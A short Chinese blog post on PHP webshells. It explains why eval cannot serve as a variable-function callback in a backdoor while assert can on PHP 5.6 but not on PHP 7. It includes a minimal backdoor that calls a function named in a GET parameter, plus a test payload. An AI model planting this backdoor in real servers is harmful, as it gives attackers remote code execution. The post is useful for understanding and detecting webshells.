---
title: webshell中 eval与assert的区别
categories: 
---
在构造后门的时候发现eval不能作为回调函数进行使用

以下测试为php5.6.9

就是这样的形式：

```
<?php 
$a = $_GET[a];
$b = $_GET[b];

$a($b);
?>
```
<!--more-->

我们不能使用 `?a=eval&b=phpinfo();`来执行命令但是可以使用 `?a=assert&b=phpinfo();`

查看eval的官方文档

>注意: 因为是一个**语言构造器**而不是一个函数，不能被 可变函数 调用。

![](https://img-blog.csdnimg.cn/2edb3cc7caf44d1fbe93e6318a7ee55d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
再去看看可变函数的定义

>PHP 支持可变函数的概念。这意味着 **如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它**。可变函数可以用来实现包括回调函数，函数表在内的一些用途。

>可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。


一目了然，因为**eval不是一个函数**，所以上面我们的调用方式是错误的

![](https://img-blog.csdnimg.cn/509f2c557feb4f9294f93b7d4abd7ef6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/6a9ba774df0641aab6efc97f3abf94a5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
还有一点在 **php7+** 中，**assert断言也已经成为语言解释器，再也不是函数了**，所以在php7中使用assert作为回调后门不能成功的原因就在于此


php7：

![](https://img-blog.csdnimg.cn/d395d889abc344d899efd3a75e1171bc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
更加深入的研究：

[分析webshell(php)以及eval与assert区别 ](https://www.freebuf.com/articles/web/258943.html)

